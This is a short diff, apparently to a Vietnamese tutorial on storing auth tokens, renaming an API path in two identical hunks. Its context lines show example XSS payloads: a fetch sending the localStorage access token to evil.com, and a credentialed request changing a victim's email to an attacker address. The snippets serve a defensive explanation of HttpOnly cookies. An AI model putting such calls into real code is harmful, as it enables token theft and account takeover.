@@ -938,7 +938,7 @@ const KY_BANG = 'v2';
 fetch('https://evil.com/?t=' + localStorage.getItem('accessToken'));
 
 <span class="tok-comment">// XSS gặp cookie HttpOnly: họ HÀNH ĐỘNG được, nhưng không CẦM được gì</span>
-fetch('/api/doi-email', {
+fetch('/api/change-email', {
   method: 'POST', credentials: 'include',
   headers: { 'content-type': 'application/json' },
   body: JSON.stringify({ email: 'ke-tan-cong@evil.com' }),
@@ -1044,7 +1044,7 @@ async function goi(url: string, opt: RequestInit = {}) {
 fetch('https://evil.com/?t=' + localStorage.getItem('accessToken'));
 
 <span class="tok-comment">// XSS gặp cookie HttpOnly: họ HÀNH ĐỘNG được, nhưng không CẦM được gì</span>
-fetch('/api/doi-email', {
+fetch('/api/change-email', {
   method: 'POST', credentials: 'include',
   headers: { 'content-type': 'application/json' },
   body: JSON.stringify({ email: 'ke-tan-cong@evil.com' }),
